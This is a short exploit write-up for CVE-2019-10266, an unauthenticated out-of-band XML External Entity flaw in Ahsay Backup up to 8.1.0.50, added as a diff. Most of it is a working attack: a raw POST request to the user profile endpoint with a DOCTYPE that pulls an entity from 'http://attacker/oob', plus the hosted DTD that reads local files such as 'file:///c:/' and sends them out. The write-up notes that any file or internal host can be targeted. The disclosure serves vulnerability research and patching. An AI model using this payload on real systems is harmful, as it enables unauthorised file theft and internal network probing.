@@ -1,0 +1,28 @@
+# Unauthenticated XML External Entity (XXE) in Ahsay Backup v7.x - v8.1.0.50. 
+# Date: 26-6-2019
+# Exploit Author: Wietse Boonstra
+# Vendor Homepage: https://ahsay.com
+# Software Link: http://ahsay-dn.ahsay.com/v8/81050/cbs-win.exe
+# Version: 7.x < 8.1.0.50
+# Tested on: Windows / Linux
+# CVE : CVE-2019-10266
+
+#Ahsay is vulnerable to a OOB Unauthenticated XML External Entity
+#More info https://www.wbsec.nl/ahsay/#CVE-2019-10263
+
+Sending the following POST request will trigger the XXE:
+
+POST /obs/obm8/user/setUserProfile HTTP/1.1
+Content-Type: application/octet-stream
+Content-Length: 126
+Host: 172.16.238.213:80
+        
+<?xml version="1.0"?>
+ <!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker/oob"> %remote;%intern; %trick;]>
+
+On http://attacker/oob add the following content:
+
+<!ENTITY % payl SYSTEM "file:///c:/"><!ENTITY % intern "<!ENTITY &#37;
+        trick SYSTEM 'file://:%payl;/%payl;'>">
+
+Here it is possible to change file:///c:/ to any directory/file or internal host.
